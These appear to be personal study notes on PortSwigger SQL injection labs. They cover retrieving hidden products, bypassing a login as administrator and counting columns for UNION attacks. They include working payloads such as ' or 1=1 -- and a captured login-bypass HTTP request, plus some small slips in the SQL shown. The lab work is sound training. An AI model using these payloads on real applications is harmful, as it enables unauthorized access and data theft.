https://www.youtube.com/watch?v=wX6tszfgYp4


# Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data                                  video: https://www.youtube.com/watch?v=X1X1UdaC_90

notes:
SQLi Product category filter (https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data) 


Query structure : SELECT * FROM products WHER
E category = 'Gifts' AND released = 1

end goal: display all products regardless of category both released and unreleased.
application by default do show unreleased product to user but sqli does it.

Analysis:

https://0a6c008403c5a91d8394f18000c4007b.web-security-academy.net/filter?category=Corporate+gifts for the url 
the query is  
SELECT * FROM products WHERE category = 'Corporate+gifts' AND released = 1

when we put ( ' ) to test the sqli   
https://0a6c008403c5a91d8394f18000c4007b.web-security-academy.net/filter?category='
for the url 
the query is  
SELECT * FROM products WHERE category = ''' AND released = 1

and it shows internal server error 


SELECT * FROM products WHERE category = ' '-- ' AND released = 1
then use  '-- , now it shows empty means the query executed hence sqli present


SELECT * FROM products WHERE category = ' '  or 1=1 -- ' AND released = 1
then use **'  or 1=1 --**  now it shows all product  means the query executed hence sqli exploited.




# Lab: SQL injection vulnerability allowing login bypass
Link: https://portswigger.net/web-security/sql-injection/lab-login-bypass


request sent for exploiting the sqli:
`POST /login HTTP/2`
`Host: 0aa7008f03eaa71f85d6a4ef008900df.web-security-academy.net`
`Cookie: session=QE7wOVq0qOUdFqMPKnt2jdgFzMOR1RFC`
`User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0`
`Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8`
`Accept-Language: en-US,en;q=0.5`
`Accept-Encoding: gzip, deflate, br`
`Content-Type: application/x-www-form-urlencoded`
`Content-Length: 81`
`Origin: https://0aa7008f03eaa71f85d6a4ef008900df.web-security-academy.net`
`Referer: https://0aa7008f03eaa71f85d6a4ef008900df.web-security-academy.net/login`
`Upgrade-Insecure-Requests: 1`
`Sec-Fetch-Dest: document`
`Sec-Fetch-Mode: navigate`
`Sec-Fetch-Site: same-origin`
`Sec-Fetch-User: ?1`
`Priority: u=0, i`
`Te: trailers`

`csrf=8ePpuDgiMTtIpvIa5QFCXEvVy8eY4ZZb&username=administrator%27--&password=%27%27`


The above request have the below url structure and Query structure
https://0a9000f803024633818f758c0079008f.web-security-academy.net/my-account?id=administrator

SELECT firstname FROM products WHERE username= 'administrator'--' and password=' '




# Retrieving data from other database tables i.e [SQL injection UNION attacks]


**SQL injection UNION attacks** :
https://portswigger.net/web-security/sql-injection/union-attacks


# Lab: SQL injection UNION attack, determining the number of columns returned by the query
(https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns)

solution: https://www.youtube.com/watch?v=umXGHbEyW5I

SQLi - Product category filter

End Goal: determine the number of columns returned by the query. 

Background (Union):

table1      table2
a | b       c | d 
-----       -----
1 , 2       2 , 3
3 , 4       4 , 5



Query #1: select a, b from table1
1,2
3,4

Query #2: select a, b from table1 UNION select c,d from table2
1,2
3,4
2,3
4,5

Union operator SQL(Microsoft):
https://learn.microsoft.com/en-us/sql/t-sql/language-elements/set-operators-union-transact-sql?view=sql-server-ver16


Rule: 
- The number and the order of the columns must be the same in all queries
- The data types must be compatible


SQLi attack (way #1):

select ? from table1 UNION select NULL
-error -> incorrect number of columns

select ? from table1 UNION select NULL, NULL, NULL
-200 response code -> correct number of columns

SQLi attack (way #2):

select a, b from table1 order by 3


script.py <url> 